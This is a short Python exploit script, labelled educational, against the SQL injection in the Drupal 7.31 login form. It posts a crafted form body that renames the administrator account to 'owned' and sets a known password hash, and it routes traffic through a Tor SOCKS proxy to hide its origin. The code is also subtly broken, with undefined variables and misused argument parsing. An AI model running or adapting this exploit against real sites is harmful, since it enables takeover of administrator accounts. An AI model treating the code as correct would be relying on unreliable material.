import requests
import sys
import argparse

"""
For Educational purposes only
"""



session.proxies = {
    'http': 'socks5://127.0.0.1:9050',
    'https': 'socks5://127.0.0.1:9050'
}

parser = argparse.ArgumentParser()
parser.add_argument('--url',description='Enter the url of your local Drupal website')
args = parser.parse_args()
args = vars(args)

url = args.url 
if url.endswith('/'):
  url = url[:-1]
  url += "/drupal-7.31/?q=node&destination=node"
else:
  url += "/drupal-7.31/?q=node&destination=node"
  


headers = {
"Host":"127.0.0.1",
"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv':' 28.0) Gecko / 20100101 Firefox / 28.0",
"Accept-Language":"en-US, en; q = 0.5", 
"Accept-Encoding":"gzip, deflate", 
"Referer":"http://127.0.0.1/drupal-7.31/", 
"Cookie": "Drupal.toolbar.collapsed=0;Drupal.tableDrag.showWeight=0;has_js=1", 
"Content-Type":"application/x-www-form-urlencoded", 
}
data="""0%20;update+users+set+name%3d'owned'+,+pass+%3d+'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld'+where+uid+%3d+'1';;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in"""
r = requests.post(url, headers=headers,data=data,proxies=proxies)

if "mb_strlen() expects parameter 1" in r.content:
    print "Host exploited"
else:
    print "Host not vulnerable"
